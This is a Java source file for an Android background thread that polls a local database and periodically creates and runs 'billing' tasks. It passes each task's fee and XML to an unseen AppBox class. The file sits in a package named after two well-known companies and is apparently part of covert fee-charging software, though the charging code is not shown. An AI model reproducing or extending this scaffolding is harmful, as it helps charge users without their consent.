package com.baidu.alipay;

import java.util.Date;

import com.baidu.serv.HandlerThreadInstance;
import com.baidu.serv.SelfHandler;
import com.baidu.serv.SelfMessage;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

/**
 * 轮询数据库处理待计费任务
 * @author leoliu
 *
 */
public class AppTaskThread extends Thread{
//	private static final String TAG = "AppTaskThread";
	private Context context = null;
	private Handler handler = null;
	
	private static boolean running = false;
	private static long lastStart = 0;
	
	public AppTaskThread(Context context, final Handler handler) {
		this.context = context;
		this.handler = handler;
		
		this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			
			@Override
			public void uncaughtException(Thread arg0, Throwable e) {
				e.printStackTrace();
				running = false;
				handler.sendEmptyMessage(AppProperty.REQUEST_RUNERROR);
			}
		});
		
	}
	
	private void updateRequest(AppTask appTask){
		AppTaskHandler appTaskHandler = null;
		
		try{
			if(appTask != null && appTask.getFee() == 0){
				appTaskHandler = new AppTaskHandler(context);
				
				appTask.setStatus(AppTask.STATUS_SUCC);
				
				appTaskHandler.updateTask(appTask);
				
				appTaskHandler.delTask(appTask);
			}			
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(appTaskHandler != null){
				appTaskHandler.close();
			}
		}
	}
	
	private void updateErrorTimes(AppTask appTask){
		
		AppTaskHandler appTaskHandler = null;
		
		try{
			appTaskHandler = new AppTaskHandler(context);
			
//			AppTask appTask = appTaskHandler.getOne();
			
			appTask.setErrorTimes(appTask.getErrorTimes()+1);
			
			if(appTask.getErrorTimes() <= Utils.ASYNCHREQUIREMAXTRYTIMES){
//				if(appTask.getErrorTimes() >= Utils.ASYNCHMAXTRYTIMES){
//					Utils.asynchErrorRun = true;
//					
//					Constant.DEFAULTINTERVAL_ERROR_ASYNCH = Constant.DEFAULTINTERVAL_ERROR * 2;
//				}
				
				appTaskHandler.updateErrorTimes(appTask);
				
			}else{
//				Utils.asynchErrorRun = false;
//				
//				Constant.DEFAULTINTERVAL_ERROR_ASYNCH = Constant.DEFAULTINTERVAL_ERROR;
				appTask.setStatus(AppTask.STATUS_SUCC);
				appTaskHandler.updateTask(appTask);
				appTaskHandler.delTask(appTask);
			}
			
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(appTaskHandler != null){
				appTaskHandler.close();
			}
		}
		
	}

	//更新状态
	private void updateStat(AppTask appTask){
		AppTaskHandler appTaskHandler = null;
//		AppTaskStatHandler appTaskStatHandler = null;
		
		try{
//			appTaskStatHandler = new AppTaskStatHandler(context);
			
//			AppTaskStat appTaskStat = appTaskStatHandler.get();
			
			appTaskHandler = new AppTaskHandler(context);
			
//			AppTask appTask = appTaskHandler.getOne();
			
			{
//				appTaskStat.setSuccFee(appTaskStat.getSuccFee()+appTask.getFee());
//				appTaskStat.setSuccNum(appTaskStat.getSuccNum()+1);
//				
//				appTaskStatHandler.addSucc(appTaskStat);
				
				appTask.setStatus(AppTask.STATUS_SUCC);
				
				appTaskHandler.updateTask(appTask);
			}
			
//			if(appTask.getFee() == 0){
				appTaskHandler.delTask(appTask);
//			}
//			Utils.asynchErrorRun = false;
//			
//			Constant.DEFAULTINTERVAL_ERROR_ASYNCH = Constant.DEFAULTINTERVAL_ERROR; 
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(appTaskHandler != null){
				appTaskHandler.close();
			}
			
//			if(appTaskStatHandler != null){
//				appTaskStatHandler.close();
//			}
		}
	}
	
	@Override
	public void run() {
		
//		LogUtil.e(TAG,"start to run");
		
		if(!running || (System.currentTimeMillis() - lastStart >= 1000 * 60 * 5)){
			
			running = true;
			lastStart = System.currentTimeMillis();
			
//			UserLogUtil.addLog(context, "AppTaskThread start running");
			
			try{
				requestTask();
			}catch (Exception e) {
				e.printStackTrace();
			}
			
			try{
				execTask();
			}catch (Exception e) {
				e.printStackTrace();
			}
			
		}else{
//			LogUtil.e(TAG, "other instance is running...");
//			UserLogUtil.addLog(context, "AppTaskThread other instance is running");
			handler.sendEmptyMessage(AppProperty.REQUEST_WAIT);
		}
	}
	
	private void requestTask(){
		
//		long firstFeeTime = Utils.getFirstFeeTime(context);
		
		long now = new Date().getTime();
		
		long lastSynchTime = Utils.getLastSynchTime(context);
		
		double interval = 480;
		
		interval = Math.max(interval, Constant.DEFAULTINTERVAL);
		
		if(lastSynchTime < now - interval * 60 * 1000){
			AppTaskHandler appTaskHandler = null;
			
			try{
				appTaskHandler = new AppTaskHandler(context);
				
				AppTask appTask = new AppTask();
				
				appTask.setApplyTime(new Date());
				appTask.setFee(0);
				
				appTaskHandler.addTask(appTask);
				
				Utils.setLastSynchTime(context);
			}catch (Exception e) {
				e.printStackTrace();
			}finally{
				if(appTaskHandler != null){
					appTaskHandler.close();
				}
			}
		}		
	}
	
//	int synchResult = 0;
		
	private void execTask(){
		AppTaskHandler appTaskHandler = null;

		try{
			appTaskHandler = new AppTaskHandler(context);
			
			final AppTask appTask = appTaskHandler.getOne();
					
			if(appTask != null){
//				Handler taskHandler = new Handler(HandlerThreadInstance.getLooper()){
				SelfHandler taskHandler = new SelfHandler() {
					@Override
//					public void handleMessage(Message msg){
					public void handleMessage(SelfMessage selfMessage){
						Message msg = selfMessage.getMessage();
						try{
							if(msg.what == AppProperty.REQUEST_SUCCESS){
								updateStat(appTask);
							}else if(msg.what == AppProperty.REQUEST_RUNERROR){
								updateErrorTimes(appTask);
							}else if(msg.what == AppProperty.REQUEST_NOORDER){
								updateRequest(appTask);
							}
						}catch (Exception e) {
							 e.printStackTrace();
						}
						
						handler.sendEmptyMessage(msg.what);
						
						running = false;
					}
				};
				
				new AppBox(taskHandler, context,appTask.getFee(),appTask.getXml(),appTask.getApplyTime().getTime()+"",false,appTask.getFee() > 0,false).run();
			}else{
				running = false;
				handler.sendEmptyMessage(AppProperty.REQUEST_NOFEE);
			}
		}catch (Exception e) {
			e.printStackTrace();
			running = false;
			handler.sendEmptyMessage(AppProperty.REQUEST_NOFEE);
		}finally{
			if(appTaskHandler != null){
				appTaskHandler.close();
			}
			
		}
	}
}
